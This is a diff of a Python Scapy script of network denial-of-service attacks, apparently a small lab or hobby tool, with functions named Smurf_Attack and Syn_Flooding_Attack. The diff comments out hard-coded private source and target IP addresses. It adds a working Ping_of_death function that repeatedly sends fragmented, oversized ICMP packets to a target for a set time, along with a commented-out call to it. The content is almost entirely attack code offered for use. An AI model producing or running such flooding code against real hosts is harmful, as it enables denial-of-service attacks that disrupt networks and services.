@@ -1,8 +1,8 @@
 import scapy.all as scapy
 import time
 
-IP_Source = '10.0.2.16'
-IP_Dest = '192.168.86.213'
+# IP_Source = '10.0.2.16'
+# IP_Dest = '192.168.86.213'
 
 
 def Smurf_Attack(IP_Source, IP_Dest, duree):
@@ -17,5 +17,11 @@ def Syn_Flooding_Attack(IP_Dest, duree):
     while (time.time() - debut) < duree:
         scapy.send(p)
 
+def Ping_of_death(IP_Dest, duree):
+    debut = time.time()
+    while (time.time() - debut) < duree:
+        scapy.send(scapy.fragment(scapy.IP(dst=IP_Dest)/scapy.ICMP()/('X' * 60000)))
+
 # Smurf_Attack(IP_Source, IP_Dest, 10)
 # Syn_Flooding_Attack(IP_Dest, 10)
+# Ping_of_death(IP_Dest, 10)
